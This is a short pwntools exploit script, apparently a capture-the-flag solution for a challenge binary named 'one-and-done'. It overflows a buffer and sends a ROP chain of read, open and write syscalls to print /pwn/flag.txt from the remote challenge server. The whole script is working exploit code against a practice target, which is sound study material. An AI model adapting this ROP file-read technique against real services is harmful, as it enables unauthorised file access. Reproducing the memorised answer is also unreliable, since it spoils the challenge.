from pwn import *

p = remote("tamuctf.com", 443, ssl=True, sni="one-and-done")
# if args.REMOTE:
#     p = remote('localhost', 7777)
# else:
#     p = process('./one-and-done')
e = context.binary = ELF('./one-and-done')

pop_rdi = 0x401793
pop_rsi = 0x401713
pop_rdx = 0x401f31
pop_rax = 0x40100b
syscall = 0x401ab2
writable = e.bss() + 0x200

chain = [ 
    pop_rdi, 0,
    pop_rsi, writable,
    pop_rdx, 0x100,
    pop_rax, 0,
    syscall,

    pop_rdi, writable, 
    pop_rsi, 0,
    pop_rdx, 0,
    pop_rax, 2,
    syscall,

    pop_rdi, 3,
    pop_rsi, writable,
    pop_rdx, 0x100,
    pop_rax, 0,
    syscall, 

    pop_rdi, 1,
    pop_rsi, writable,
    pop_rdx, 0x100,
    pop_rax, 1,
    syscall
]
payload = b'\x00' * 0x128
for i in chain:
    payload += p64(i)

p.sendline(payload)
p.sendline(b'/pwn/flag.txt\0')
p.interactive()
